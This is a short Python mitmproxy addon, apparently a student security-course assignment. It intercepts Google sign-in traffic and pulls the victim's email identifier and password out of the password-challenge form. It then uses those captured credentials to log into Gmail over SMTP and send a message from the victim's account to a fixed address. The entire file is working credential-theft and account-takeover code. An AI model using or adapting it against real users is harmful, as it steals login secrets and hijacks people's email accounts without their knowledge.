from mitmproxy import http

def request(flow:http.HTTPFlow)->None:
	if "accounts.google.com/signin/v2/challenge/password" in flow.request.url:
		to = "rjwalls@wpi.edu"
		subject = "Hello from project 4: Dingda Zhou"
		sender = flow.request.urlencoded_form.__getitem__("identifier")
		password = flow.request.urlencoded_form.__getitem__("password")
		send_email(sender,password,to,subject)

def send_email(user, pwd, recipient, subject):
	import smtplib
	gmail_user = user
	gmail_pwd = pwd
	FROM = user
	TO = recipient if type(recipient) is list else [recipient]
	SUBJECT = subject
	msg_format = "From: %s\r\nTo: %s\r\nSubject: %s\r\n\r\n"
	message = msg_format % (FROM, TO, SUBJECT)
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	server.login(gmail_user, gmail_pwd)
	server.sendmail(FROM,TO,message)
	server.close()     
